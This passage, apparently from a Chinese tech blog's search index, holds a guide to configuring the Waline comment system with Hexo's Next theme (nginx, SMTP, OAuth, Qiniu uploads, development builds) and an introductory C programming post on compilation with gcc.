always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; # 反向代理 proxy_pass http://$server_name; proxy_set_header Host $host:$server_port; proxy_set_header X-NginX-Proxy true; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr; # 缓存 add_header X-Cache $upstream_cache_status; add_header Cache-Control no-cache; expires 12h;} Next 主题安装 Waline 官方插件安装 Waline 官方插件Waline 官方插件的版本必须与 Next 主题的版本匹配，否则 Waline 官方插件无法正常使用，两者的兼容性说明如下： Next 主题的版本 Waline 官方插件的版本 &lt;= 8.3.0 &lt;= 1.0.8 &gt;= 8.4.0 &gt;= 2.0.0 12345# 进入博客的根目录$ cd /blog-root# 安装Waline插件（默认是最新版本）$ npm install @waline/hexo-next --save 配置 Waline 官方插件更改 Next 主题的配置文件 themes/next/_config.yml，添加以下内容，其中 serverURL 是 Waline Server 的访问 URL，需要自行更改该属性的值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# Waline Config File# For more information:# - https://waline.js.org# - https://waline.js.org/reference/component.htmlwaline: # New! Whether enable this plugin enable: true # Waline server address url, you should set this to your own link serverURL: https://waline.vercel.app # Waline library CDN url, you can set this to your preferred CDN # libUrl: https://unpkg.com/@waline/client@v2/dist/waline.js # Waline CSS styles CDN url, you can set this to your preferred CDN cssUrl: https://unpkg.com/@waline/client@v2/dist/waline.css # Custom locales # locale: # placeholder: Welcome to comment # Comment box placeholder # If false, comment count will only be displayed in post page, not in home page commentCount: true # Pageviews count, Note: You should not enable both `waline.pageview` and `leancloud_visitors`. pageview: false # Custom emoji # emoji: # - https://unpkg.com/@waline/emojis@1.0.1/weibo # - https://unpkg.com/@waline/emojis@1.0.1/alus # - https://unpkg.com/@waline/emojis@1.0.1/bilibili # - https://unpkg.com/@waline/emojis@1.0.1/qq # - https://unpkg.com/@waline/emojis@1.0.1/tieba # - https://unpkg.com/@waline/emojis@1.0.1/tw-emoji # Comment infomation, valid meta are nick, mail and link # meta: # - nick # - mail # - link # Set required meta field, e.g.: [nick] | [nick, mail] # requiredMeta: # - nick # Language, available values: en-US, zh-CN, zh-TW, pt-BR, ru-RU, jp-JP # lang: zh-CN # Word limit, no limit when setting to 0 # wordLimit: 0 # Whether enable login, can choose from \'enable\', \'disable\' and \'force\' # login: enable # comment per page # pageSize: 10 更改 Next 主题的样式由于 Next 主题默认对所有图片都添加了 display: block; CSS 样式，这会导致 Waline 的表情包图片独立一行显示，需要往 Next 主题里添加以下自定义样式来解决，例如更改样式文件 themes/next/source/css/_common/scaffolding/base.styl 123.wl-content .vemoji, .wl-content .wl-emoji { display: inline !important;} Hexo 构建失败的解决方法若 Next 主题安装 Waline 官方插件后，执行 hexo g 命令抛出以下异常，这是由于 Hexo 或者 Next 的版本过低导致，此时需要升级 Hexo 或者 Next 的版本 1234567891011121314151617181920212223ERROR Render HTML failed: index.htmlTypeError: Cannot read property \'parent\' of null at Function.exports.update (/usr/local/hexo/node_modules/cheerio/lib/parse.js:55:26) at module.exports (/usr/local/hexo/node_modules/cheerio/lib/parse.js:17:11) at Function.exports.load (/usr/local/hexo/node_modules/cheerio/lib/static.js:22:14) at Hexo.hexoMetaGeneratorInject (/usr/local/hexo/node_modules/hexo/lib/plugins/filter/meta_generator.js:8:21) at Hexo.tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo/node_modules/bluebird/js/release/method.js:15:34) at Promise.each.filter (/usr/local/hexo/node_modules/hexo/lib/extend/filter.js:60:50) at tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromiseCtx (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:641:10) at _drainQueueStep (/usr/local/hexo/node_modules/bluebird/js/release/async.js:97:12) at _drainQueue (/usr/local/hexo/node_modules/bluebird/js/release/async.js:86:9) at Async._drainQueues (/usr/local/hexo/node_modules/bluebird/js/release/async.js:102:5) at Immediate.Async.drainQueues [as _onImmediate] (/usr/local/hexo/node_modules/bluebird/js/release/async.js:15:14) at runCallback (timers.js:705:18) at tryOnImmediate (timers.js:676:5) at processImmediate (timers.js:658:5) Waline 第三方插件列表hexo-waline-next hexo-waline-next，一款更强大且适用于 Next 主题的 Waline 插件，支持上传评论图片到七牛图床 hexo-next-darkmode hexo-next-darkmode，一款适用于 Waline 与 Next 主题的暗黑模式切换插件，详细的使用说明请看这里 Waline 进阶配置客户端使用 CDNWaline 客户端若想使用 CDN 加速，只需在 Next 主题的 _config.yml 配置文件中，更改 Waline 官方插件的配置（如下所示）即可。由于 Waline 采用 Client/Server 架构，客户端与服务端的版本一般需要匹配才能正常运行；因此不建议每次自动都获取最新版的客户端文件，而是推荐日后统一更新客户端与服务端的版本。 123456789# 获取最新版本的Walinewaline: libUrl: https://unpkg.com/@waline/client@v2/dist/waline.js cssUrl: https://unpkg.com/@waline/client@v2/dist/waline.css# 获取指定版本的Walinewaline: libUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.js cssUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.css 验证用户注册邮箱用户注册和评论的邮件通知都会用到邮件服务，配置邮件服务相关变量后，用户注册流程会增加邮箱验证码确认相关的操作，用来防止恶意的注册。 环境变量名称 备注 SMTP_SERVICE SMTP 邮件发送服务提供商 SMTP_HOST SMTP 服务器地址，一般可以在邮箱的设置中找到。 SMTP_PORT SMTP 服务器端口，一般可以在邮箱的设置中找到。 SMTP_USER SMTP 邮件发送服务的用户名，一般为登录邮箱。 SMTP_PASS SMTP 邮件发送服务的密码，一般为邮箱登录密码，部分邮箱 (例如 163) 是单独的 SMTP 密码。 SENDER_NAME 自定义发送邮件的发件人 SENDER_EMAIL 自定义发送邮件的发件地址 提示：可以在这里查看支持的邮箱服务商，SMTP_SERVICE 和 (SMTP_HOST、SMTP_PORT）任选其一进行配置即可。如果在邮箱服务商列表中没有对应的 SMTP_SERVICE ，则需要同时配置 SMTP_HOST 和 SMTP_PORT。 客户端配置用户头像Waline 目前使用 Libravatar 来获取评论列表头像。Libravatar 是自由、开放的头像服务，支持联邦托管并与 Gravatar 完全兼容。首先博主或者用户自行使用邮箱登录或注册 Libravatar，然后更改自己的 Libravatar 头像。当在博客评论的时候，留下在 Libravatar 注册时所使用的邮箱即可，或者使用 Waline 客户端提供的登录功能；最后 Waline 会自动根据邮箱地址去 Libravatar 获取用户的头像，当未能从 Libravatar 查询到头像时，将会自动转为从 Gravatar 查询。目前 Waline 非自定义头像有以下 7 种默认值可选： 在 Waline Server 中，通过配置环境变量 GRAVATAR_STR 来指定 Libravatar 头像服务的地址（基于 Nunjucks 语法），这样就可以自定义客户端所使用的用户头像类型，如下所示： 1GRAVATAR_STR: \'https://seccdn.libravatar.org/avatar/{{mail|md5}}?d=robohash\' 若 Libravatar 或者 Gravatar 在国内被墙，此时还可以使用 Cravatar 替代。在 Waline Server 中配置以下环境变量，就可以快速切换到 Cravatar，并自定义客户端所使用的用户头像类型： 12AVATAR_PROXY: \'false\'GRAVATAR_STR: \'https://cravatar.cn/avatar/{{mail|md5}}?d=robohash\' 特别注意 尽管诸如谷歌、QQ 等邮件提供商对电子邮件不区分大小写，但是你仍需要保证 Libravatar 或者 Gravatar 注册的邮箱和填入的邮箱地址对应。虽然全球大部分大型邮件提供商均不对电子邮件用户名区分大小写，但是根据 RFC 5231 的规定，电子邮件是区分大小写的。这意味着邮件提供商可以将 abc@xxx.com 和 ABC@xxx.com 视为不同的账号，而且也的确有邮件提供商这样处理。所以为防止使用此类邮件提供商的用户无法收到邮件或显示错误的头像，Waline 并不会对邮箱进行大小写转换。 服务端配置评论通知当博客有用户发布评论或者用户回复评论时，Waline 支持对博主和回复评论作者进行通知。博主评论通知支持邮件、微信、QQ 与 Telegram，回复评论作者仅支持邮件通知。由于篇幅有限，这里仅介绍邮箱通知的配置，其他的通知方式可参考官方文档。邮件通知需要在环境变量中配置以下属性： AUTHOR_EMAIL：博主邮箱，用来区分发布的评论是否是博主本身发布的。如果是博主发布的则不进行提醒通知。 SMTP_SERVICE：SMTP 邮件发送服务提供商，可以在 这里 查看所有支持的运营商。如果没在列表中的可以自行配置 SMTP_HOST 和 SMTP_PORT。 SMTP_HOST：SMTP 服务器地址，一般可以在邮箱的设置中找到。如果未配置 SMTP_SERVICE 的话该项必填。 SMTP_PORT：SMTP 服务器端口，一般可以在邮箱的设置中找到。如果未配置 SMTP_SERVICE 的话该项必填。 SMTP_USER：SMTP 邮件发送服务的用户名，一般为登录邮箱。 SMTP_PASS：SMTP 邮件发送服务的密码，一般为邮箱登录密码，部分邮箱（例如 163）是单独的 SMTP 密码。 SMTP_SECURE： SMTP 邮件发送加密，默认为 true，设置为 false 则不会加密请求 SITE_NAME：网站名称，用于在消息中显示。 SITE_URL：网站地址，用于在消息中显示。 SENDER_NAME：自定义发送邮件的发件人，选填。 SENDER_EMAIL：自定义发送邮件的发件地址，选填。 MAIL_SUBJECT：评论回复邮件标题自定义 MAIL_TEMPLATE：评论回复邮件内容自定义 MAIL_SUBJECT_ADMIN：新评论通知邮件标题自定义 MAIL_TEMPLATE_ADMIN：新评论通知邮件内容自定义 提示 用户注册和评论的邮件通知都会用到邮件服务 由于国内腾讯云、阿里云默认禁用了 25 端口，若 Waline 的服务端是部署在云服务器上，则需要使用 465 端口，并启用 SSL 邮件加密，最后系统防火墙别忘了开放 465 端口 Waline Client 的其他特性自定义样式Waline 客户端默认提供了一些 CSS 变量，可以很轻松的通过这些变量自定义 Waline 客户端的 CSS 样式： 1234567891011121314151617181920212223242526272829303132333435363738394041424344:root { /* 字体大小 */ --waline-font-size: 16px; /* 常规颜色 */ --waline-white: #fff; --waline-light-grey: #999; --waline-dark-grey: #666; /* 主题色 */ --waline-theme-color: #27ae60; --waline-active-color: #2ecc71; /* 布局颜色 */ --waline-color: #444; --waline-bgcolor: #fff; --waline-bgcolor-light: #f8f8f8; --waline-bgcolor-hover: #f0f0f0; --waline-border-color: #ddd; --waline-disable-bgcolor: #f8f8f8; --waline-disable-color: #bbb; --waline-code-bgcolor: #282c34; /* 特殊颜色 */ --waline-bq-color: #f0f0f0; /* 头像 */ --waline-avatar-size: 3.25rem; --waline-m-avatar-size: calc(var(--waline-avatar-size) * 9 / 13); /* 徽章 */ --waline-badge-color: #3498db; --waline-badge-font-size: 0.775em; /* 信息 */ --waline-info-bgcolor: #f8f8f8; --waline-info-color: #999; --waline-info-font-size: 0.625em; /* 渲染选择 */ --waline-border: 1px solid var(--waline-border-color); --waline-avatar-radius: 50%; --waline-box-shadow: none;} 如果使用了一个大量运用阴影 (box-shadow) 的主题，可以通过修改 --waline-border 和 --waline-box-shadow 来更改 Waline 客户端的阴影样式，如: 12345678910:root { --waline-border: none; --waline-box-shadow: 0 12px 40px rgb(134 151 168 / 25%);}@media (prefers-color-scheme: dark) { body { --waline-box-shadow: 0 12px 40px #0f0e0d; }} 如果上面的 CSS 变量无法满足你对 Waline 样式的定制要求，你可以停止导入 Waline 官方提供的样式，并自己制作 CSS。 自定义表情包 Waline 客户端自定义表情包 启用暗黑模式Waline 客户端默认支持暗黑模式，只需在 Waline 客户端初始化的时候，指定 dark 参数即可 设置 dark: auto 会根据设备颜色模式自动切换 填入 CSS 选择器，则会在对应选择器生效时启用暗黑模式 针对不同的 Hexo 主题，Waline 客户端的配置示例如下： vuepress-theme-hope：它会在 &lt;body&gt; 上添加 theme-dark class 来开启暗黑模式，那么需要将 dark 选项设置为 body.theme-dark Docusaurus：它会在 &lt;html&gt; 上通过设置 data-theme="dark" 开启暗黑模式，那么需要将 dark 选项设置为 \'html[data-theme="dark"]\' hexo-theme-fluid：它会在 &lt;html&gt; 上通过设置 data-user-color-scheme="dark" 开启暗黑模式，那么需要将 dark 选项设置为 \'html[data-user-color-scheme="dark"]\' 若 Hexo 使用的是 Next 主题，且是通过插件 hexo-next-darkmode 来自动添加可切换的暗黑模式，那么可以在 Next 主题的 _config.yml 配置文件里添加以下内容来启用 Waline 客户端的暗黑模式 1234waline: enable: true dark: \'body.darkmode--activated\' ... 在暗黑模式下，Waline 客户端默认会使用以下样式，若希望自定义暗黑模式的 CSS 样式，直接覆盖以下 CSS 样式即可。 12345678910111213141516171819202122/* 根据用户设置 ↓ */darkmode-selector { /* 常规颜色 */ --waline-white: #000; --waline-light-grey: #666; --waline-dark-grey: #999; /* 布局颜色 */ --waline-color: #888; --waline-bgcolor: #1e1e1e; --waline-bgcolor-light: #272727; --waline-border-color: #333; --waline-disable-bgcolor: #444; --waline-disable-color: #272727; /* 特殊颜色 */ --waline-bq-color: #272727; /* 其他颜色 */ --waline-info-bgcolor: #272727; --waline-info-color: #666;} 提示 Next 主题使用插件 hexo-next-darkmode 来自动添加可切换的暗黑模式，详细的步骤可以参考这篇博客。 Github 社交登录最新版 Waline 增加了登录评论功能，除了普通的账号登录之外，还支持使用第三方社交账号进行直接登录。目前官方支持 Github 社交账号登录，当然默认没有开启 Github 社交账号登录功能，需要做一些配置才能支持。若要增加 Github 账号登录功能，需要配置 Github OAuth 密钥。点击 《Register a new OAuth application》 进入 Github OAuth 应用申请页面，这里需要填入以下几个配置： Application name：应用名称，可以随意，会在用户授权时显示，推荐使用博客名称。 Homepage URL：应用主页地址，可以随意，会在用户授权时显示，推荐使用博客地址。 Appcation description：应用描述，可以随意，会在用户授权时显示，非必填项。 Authorization callback URL：应用的回调地址，登录时需要使用。填入 &lt;serverURL&gt;/oauth/github 其中 &lt;serverURL&gt; 是你的 Waline 服务端地址。 填完后点击 Register application 按钮就成功创建应用了，可以在页面中看到 Client ID。点击 Client secrets 栏右边的 Generate a new client secret 按钮，可以获取到该应用的 Client secrets。 最后按照如下环境变量配置，将上面获取到的密钥（Client secrets）配置进 Waline 服务端的环境变量中，然后重新部署 Waline 服务端后即可使用 Github 登录。 环境变量名称 备注 GITHUB_ID 对应 Github OAuth Application 中的 Client ID GITHUB_SECRET 对应 Github OAuth Application 中的 Client secrets 由于 Github 的 API 调用在国内不太稳定，建议直接使用普通的账号登录 上传图片至七牛图床Waline 客户端内置了图像上传的支持，默认会将图片转换为 Base64 字符串，然后通过 Waline Server 进行存储，例如将图片存储到 MySQL。在 Hexo 的 Next 主题下，若希望使用七牛图床，则可以安装 Waline 的第三方插件 hexo-waline-next 来实现。 12345# 卸载Waline官方插件$ npm uninstall @waline/hexo-next --save# 安装Waline第三方插件（默认是最新版本）$ npm install hexo-waline-next --save 第三方插件 hexo-waline-next 使用了七牛官方的 Qiniu-JavaScript-SDK ，为了安全考虑，默认没有包含 Upload Token 的生成实现，因此 Upload Token 需要通过网络从服务端（自建）获取，服务端代码可以参考七牛服务端 SDK 的文档，插件的配置示例如下： 123456waline: enable: true qiniuDebug: false # print the error message of the picture uploaded by qiniu qiniuDomain: https://qiniu.example.cn # The custom domain for qiniu, e.g https://qiniu.example.cn qiniuTokenUrl: https://api.example.cn/qiniu/sdk/token/upload # The api to get qiniu token, e.g https://api.example.cn/qiniu/sdk/token/upload ... qiniuDomain：七牛的外链域名 qiniuDebug：前端是否输出七牛上传图片的错误信息 qiniuTokenUrl：获取七牛 Upload Token 的接口地址 若希望禁用图片上传的功能，可以使用以下配置内容，适用于 Waline 客户端默认的图片上传和七牛图床上传： 1234waline: enable: true allowUploadImage: false # Allow upload picture ... allowUploadImage：是否允许上传图片，默认值为：true 第三方插件 hexo-waline-next 对七牛 Upload Token 接口返回数据（JSON）的定义如下： 1234{ "data": "tdvdhnpSs2JFt8U9-c9hL74ddWtEj", "msg": "success"} 参数名称 类型 实例值 说明 status code Number 200 HTTP 响应状态码，成功返回 200，非法请求来源返回 403，接口调用太频繁返回 429，系统内部出错返回 500 data String tdvdhnpSs2JFt8U9-c9hL74ddWtEj Upload Token 的值 msg String success 消息提示内容 提高七牛 Upload Token 接口的安全性： 全站启用 HTTPS 协议 通过 HTTP Header 的 referer 、 X-Real-IP 、X-Forwarded-For 等来限制请求来源的域名、IP 获取 Upload Token 的接口应该内置限流功能，避免外部恶意频繁调用接口，例如限制每分钟只能调用两次接口 服务端生成 Upload Token 时，应该指定上传策略，例如设置 Token 的有效时间（expires、deadline），具体可参考七牛官方文档一、七牛官方文档二，Java 版服务端的示例代码如下： 1234567891011String bucket = "bucket name";String accessKey = "access key";String secretKey = "secret key";//指定UploadToken的有效时间为10秒long expireSeconds = 10;StringMap putPolicy = new StringMap();Auth auth = Auth.create(accessKey, secretKey);String upToken = auth.uploadToken(bucket, null, expireSeconds, putPolicy);System.out.println(upToken); Waline 开发指南准备工作 使用 Git 克隆项目 1$ git clone https://github.com/lizheming/waline.git 保证 NPM 的版本是 7 Node 14 及以下默认使用 npm@v6，你需要确保自己使用 npm@v7 版本，否则运行或者编译构建 Waline 组件时会出错 12345# 安装最新版的NPM$ npm i -g npm@latest# 查看NPM的版本$ npm -v 安装依赖 123$ cd waline$ npm i 本地开发本地使用以下命令启动 @waline/client，由于 Waline 采用 Client/Server 架构，在调试 client 时，必须配置本地环境变量 SERVERURL 至 waline/packages/client/.env，其中在 waline/packages/client/.env.example 文件里有可参考的配置示例。 1$ npm run client:dev @waline/client 正常启动时，输出的日志信息如下，此时浏览器直接访问 http://127.0.0.1:9000 就可以开始测试本地的 @waline/client 123456789101112131415161718192021222324252627&gt; client:dev&gt; npm run dev --workspace=@waline/client&gt; @waline/client@1.3.3 dev&gt; webpack serve --mode=development --config ./build/webpack.config.js&lt;i&gt; [webpack-dev-server] Project is running at:&lt;i&gt; [webpack-dev-server] Loopback: http://127.0.0.1:9000&lt;i&gt; [webpack-dev-server] On Your Network (IPv4): http://192.168.1.128:9000/&lt;i&gt; [webpack-dev-server] Content not from webpack is served from \'/usr/local/waline/packages/client/public\' directoryasset Waline.min.js 1010 KiB [emitted] (name: main) 1 related assetasset index.html 967 bytes [emitted]runtime modules 27.1 KiB 13 modulescacheable modules 832 KiB modules by path ./src/ 95.3 KiB 48 modules modules by path ../../node_modules/ 737 KiB modules by path ../../node_modules/webpack-dev-server/client/ 48.9 KiB 12 modules modules by path ../../node_modules/style-loader/dist/runtime/*.js 5.02 KiB 6 modules modules by path ../../node_modules/webpack/hot/*.js 4.3 KiB 4 modules modules by path ../../node_modules/html-entities/lib/*.js 81.3 KiB 4 modules modules by path ../../node_modules/@vue/ 437 KiB 4 modules modules by path ../../node_modules/url/ 37.4 KiB 3 modules modules by path ../../node_modules/querystring/*.js 4.51 KiB ../../node_modules/querystring/index.js 127 bytes [built] [code generated] ../../node_modules/querystring/decode.js 2.34 KiB [built] [code generated] ../../node_modules/querystring/encode.js 2.04 KiB [built] [code generated]webpack 5.50.0 compiled successfully in 3160 ms 如果希望在 Hexo Next 主题里测试本地的 @waline/client，那么可以在 Next 的 _config.yml 配置文件中指定 Waline 插件的 libUrl 参数，配置示例如下： 1234waline: enable: true libUrl: http://127.0.0.1:9000/Waline.min.js # Set custom waline cdn url .... 本地使用以下命令启动 @waline/server，为了使 @waline/server 能在本地正常运行，需要配置必要的本地环境变量至 waline/example/.env，其中在 waline/example/.env.example 文件里有可参考的配置示例。@waline/server 正常启动后，默认的服务器地址是 http://127.0.0.1:9000。 1$ npm run server:dev 编译构建12345678# 构建@waline/admin$ npm run admin:build# 构建@waline/client$ npm run client:build# 或者同时构建@waline/admin与@waline/client$ npm run build Waline 组件编译构建完成后，默认会在 waline/node_modules/@waline 目录下生成对应的文件，目录结构如下： 12345waline/node_modules/@waline├── admin -&gt; ../../packages/admin├── client -&gt; ../../packages/client├── cloudbase -&gt; ../../packages/cloudbase└── vercel -&gt; ../../packages/server 值得一提的是，以 @waline/client 组件为例，编译构建完成后，实际的输出路径是：waline/packages/client/dist Waline 常见问题防止恶意刷评论 Waline 服务端启用评论审核功能 Waline 服务端启用基于 IP 的评论发布频率限制功能 Waline 服务端启用客户端登录后才允许评论的功能，确保服务端的版本大于等于 0.26.0，同时 Waline 的客户端需要增加 login=force 的配置用于隐藏博客页面上的评论匿名输入框 Waline 的服务端如果启用客户端登录后才允许评论的功能，那么还需要在服务端的环境变量里配置邮件服务相关的参数；这是为了防止恶意注册，当配置了邮件服务相关的环境变量后，用户注册流程会增加邮箱验证码确认相关的操作 Waline 发布评论很慢发布评论的时候因为一些特殊原因，例如垃圾邮件检测、评论通知都是串联操作。其中垃圾邮件检测使用的是 Akismet 提供的服务，这块由于调用国外服务可能会造成访问过慢，可以通过 AKISMET_KEY=false 后端环境变量关闭垃圾评论检测功能来定位问题。除了垃圾评论检测服务之外，评论通知中的邮件通知也有可能造成超时，这块建议可以先关闭评论通知再测一下是否是因为该功能导致的过慢。 Github 登录无法管理后台Github 登录后无法管理后台，解决方法可参考 Github Issue：通过 Github 登录无法管理后台 Waline 版本更新流程 更新 MySQL 数据库表结构 更新 Hexo-Waline-Next 插件 更新 Waline Server 的代码，重新构建 Docker 镜像 若在 Next 主题的 _config.yml 文件中，Waline 官方插件的 CDN 配置里有指定 Waline Client 的版本（如下配置），那么还需要更改 Client 的版本号，否则默认会使用最新版的 Waline Client 1234waline: enable: true libUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.js cssUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.css 提示 由于 Waline 采用 Client/Server 架构，客户端与服务端的版本一般需要匹配才能正常运行。 waline/packages/server/src/controller/index.js 源文件涉及到 Waline Client 版本的定义（最新版本） waline/packages/server/src/middleware/dashboard.js 源文件涉及到 Waline Admin 版本的定义（最新版本） 项目源码 Waline Github Waline DockerHub 参考博客 Waline 官方中文文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"C 语言基础之一",url:"/posts/1228be9f.html",text:'语言发展历程机器语言计算机的大脑或者说心脏就是 CPU，它控制着整个计算机的运作。每种 CPU，都有自己的指令系统。这个指令系统，就是该 CPU 的机器语言。机器语言是一组由 0 和 1 系列组成的指令码，这些指令码，是 CPU 制造厂商规定出来的，然后发布出来，要求程序员遵守。要让计算机干活，就得用机器语言（二级制数）去命令它。这样的命令，不是一条两条，而是上百条。不同型号的计算机其机器语言是不相通的，也就是使用某种计算机的机器指令编制的程序，不能在另一种计算机上执行。 汇编语言机器语言编程很令人烦恼，因此终于出现了汇编语言，就是一些标识符取代 0 与 1。汇编语言是一门人类可以比较轻松认识的编程语言。只是这门语言计算机并不认识，所以人类还不能用这门语言命令计算机做事情。所以，有一类专门的程序，既认识机器语言，又认识汇编语言，也就是编译器，将标识符换成 0 与 1，知道怎么把汇编语言翻译成机器语言。 高级语言汇编语言和机器语言都是面向机器的，机器不同，语言也不同。既然有办法让汇编语言翻译成机器语言，难道就不能把其他更人性化的语言翻译成机器语言？1954 年，Fortran 语言出现了，其后相继出现了其他的类似语言。这批语言，使程序员摆脱了计算机硬件的限制，把主要精力放在了程序设计上，不在关注低层的计算机硬件。这类语言，称为高级语言。同样的，高级语言要被计算机执行，也需要一个翻译程序将其翻译成机器语言，这就是编译程序，简称 “编译器”。这类高级语言解决问题的方法是分析出解决问题所需要的步骤，把程序看作是数据被加工的过程。基于这类方法的程序设计语言，成为了面向过程的语言。 语言的层次 语言的进化史 为什么要学习 C 语言C 语言的特点优点： 代码量小 功能强大 编程自由 执行速度快 缺点： 可移植性较差 对平台库依赖较多 写代码实现周期长 过于自由，经验不足易出错 学习 C 语言理由 C 语言的应用领域C 语言的应用极其广泛，从网站后台，到底层操作系统，从多媒体应用到大型网络游戏，均可使用 C 语言来开发： C 语言可以写网站后台程序 C 语言可以专门针对某个领域写出功能强大的程序库 C 语言可以写出大型游戏的引擎 C 语言可以写出另一个语言来，例如：PHP 纯 C 语言开发的 C 语言可以写操作系统和驱动程序，并且一般只能用 C 语言编写 任何设备只要配置了微处理器，就都支持 C 语言。从微波炉到手机，都是由 C 语言技术来推动的 详见：各类语言的应用领域图解分析 第一个 C 语言程序编写代码123456#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { printf("Hello World!\\n"); return 0;} 编译代码 GCC 编译命令常用选项说明 选项 含义 -o 指定生成的输出文件名 -E 只进行预处理 -S 只进行预处理和编译 -c 只进行预处理、编译和汇编 编译代码，生成可以执行文件 1$ gcc hello.c -o hello 运行代码 运行可执行文件 123$ ./helloHello World! 代码分析 #include 头文件包含： #include 的意思是头文件包含，#include &lt;stdio.h&gt; 表示包含 stdio.h 这个头文件 使用 C 语言库函数时，需要提前包含库函数对应的头文件，如这里使用了 printf() 函数，则需要包含 stdio.h 头文件 #include &lt;&gt; 与 #include "" 的区别： &lt;&gt; 表示编译器直接按系统指定的目录（/usr/include）检索头文件 "" 表示系统先在 "" 指定的路径（没写路径则默认使用当前路径）查找头文件，如果找不到，再按系统指定的目录检索 main() 函数 一个完整的 C 语言程序，是由一个、且只能有一个 main() 函数（又称主函数，必须有）和若干个其他函数结合而成（可选） main() 函数是 C 语言程序的入口，程序是从 main() 函数开始执行的 printf() 函数 printf() 是 C 语言库函数，功能是向标准输出设备输出一个字符串 printf() 函数在 stdio.h 头文件里定义 \\n 表示回车换行 return 语句 return 代表函数执行完毕 如果 main() 函数定义的时候前面是 int，那么 return 后面就需要写一个整数 如果 main() 函数定义的时候前面是 void，那么 return 后面什么也不需要写 在 main() 函数中 return 0 代表程序执行成功，return -1 代表程序执行失败 int main() 和 void main() 在 C 语言中都是支持的，但 C++ 只支持 int main() 这种定义方式 system 函数system 函数的定义1234567头文件：#include &lt;stdlib.h&gt;声明：int system(const char *command);功能：在已经运行的程序中执行另外一个外部程序参数：外部可执行程序名字返回值： 成功：不同系统返回值不一样 失败：通常是 -1 system 函数的调用12345678#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) { system("ls"); // Linux 平台 // system("calc"); // Windows 平台 return 0;} system 函数的返回值在 Linux 和 Windows 系统下分别调用 system() 函数，若调用成功返回值是不一样的，若调动失败返回值一般为 -1。C 语言所有的库函数调用，只能保证语法是一致的，但不能保证执行结果是一致的；同样的库函数在不同的操作系统下执行结果可能是一样的，也可能是不一样的。Linux 的发展离不开 POSIX 标准，只要符合这个标准的函数，在不同的系统下执行的结果就可以一致。Unix 和 Linux 很多库函数都是支持 POSIX 标准的，但 Windows 支持的比较差。如果将 Unix 代码移植到 Linux 一般代价很小，如果把 Windows 代码移植到 Unix 或者 Linux 就比较麻烦。 C 语言的编译过程C 语言的编译步骤C 语言编译成可执行程序需要经过以下 4 个步骤，详见 编译流程图。 预处理：宏定义展开、头文件展开、条件编译等，同时将代码中的注释删除，这里并不会检查语法 编译：检查语法，将预处理后文件编译生成汇编文件 汇编：将汇编文件生成目标文件（二进制文件） 链接：C 语言编写的程序是需要依赖各种库的，所以编译之后还需要把库链接到最终的可执行程序中去 GCC 的编译过程GCC 的编译步骤 步骤 命令 1. 预处理 gcc -E hello.c -o hello.i 2. 编译到汇编代码 gcc -S hello.c -o hello.s 3. 汇编到目标代码（二进制文件） gcc -c hello.s -o hello.o 4. 链接，生成可执行文件 gcc hello.o -o hello 值得一提的是，以上四个步骤，可以合成一个步骤，直接编译链接成可执行目标文件，命令是 gcc hello.c -o hello 文件后缀的不同含义 文件后缀 含义 .c C 语言文件 .i 预处理后的 C 语言文件 .s 编译后的汇编文件 .o 编译后的目标文件 查找程序所依赖的动态库12345678# GCC编译$ gcc hello.c -o hello# 查看所依赖的动态库$ ldd hello linux-vdso.so.1 =&gt; (0x00007f152053a000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f151ff4d000) /lib64/ld-linux-x86-64.so.2 (0x00007f152031b000) 在 Windows 系统里，可以使用 Dependency Walker 工具查看程序所依赖的动态库（DLL），如下图所示： VS 中 C 语言嵌套汇编代码在 Visual Studio 中，由于下述代码使用了 eax 寄存器，因此程序需要运行在 32 位（x86）的平台。 12345678910111213141516171819#include &lt;stdio.h&gt;int main() { int a; int b; int c; __asm { mov a, 3 // 3的值放在a对应内存的位置 mov b, 4 // 4的值放在a对应内存的位置 mov eax, a // 把a内存的值放在eax寄存器 add eax, b // eax和b相加，结果放在eax mov c, eax // eax的值放在c中 } printf("c = %d\\n", c); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); 